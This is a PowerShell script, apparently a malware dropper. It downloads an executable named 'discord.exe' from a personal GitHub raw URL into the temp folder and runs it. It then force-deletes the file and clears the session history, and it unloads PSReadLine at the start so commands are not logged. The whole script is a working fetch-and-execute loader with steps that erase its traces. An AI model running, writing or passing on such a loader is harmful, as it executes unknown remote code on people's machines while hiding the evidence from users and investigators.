```powershell
# ===== CONFIG =====
$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/discord.exe"

# ===== DISABLE CURRENT SESSION HISTORY =====
try {
    Remove-Module PSReadLine -ErrorAction SilentlyContinue
} catch {}

# ===== TEMP FILE =====
$tempExe = Join-Path $env:TEMP "discord.exe"

# ===== DOWNLOAD =====
Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe

# ===== CHECK =====
if (Test-Path $tempExe) {

    Write-Host "Downloaded"

    # ===== RUN =====
    $proc = Start-Process $tempExe -PassThru

    # ===== WAIT PROCESS CLOSE =====
    $proc.WaitForExit()

    # ===== WAIT EXTRA =====
    Start-Sleep -Seconds 2

    # ===== DELETE WITH RETRY =====
    $maxTry = 5

    for ($i = 1; $i -le $maxTry; $i++) {

        try {

            if (Test-Path $tempExe) {

                Remove-Item $tempExe -Force -ErrorAction Stop

                Write-Host "Deleted"

                break
            }

        } catch {

            Write-Host "Retry delete $i"

            Start-Sleep -Seconds 2
        }
    }

    # ===== CLEAR CURRENT SESSION HISTORY =====
    Clear-History

    Write-Host "Finished"
}
else {

    Write-Host "Download failed"

}
```
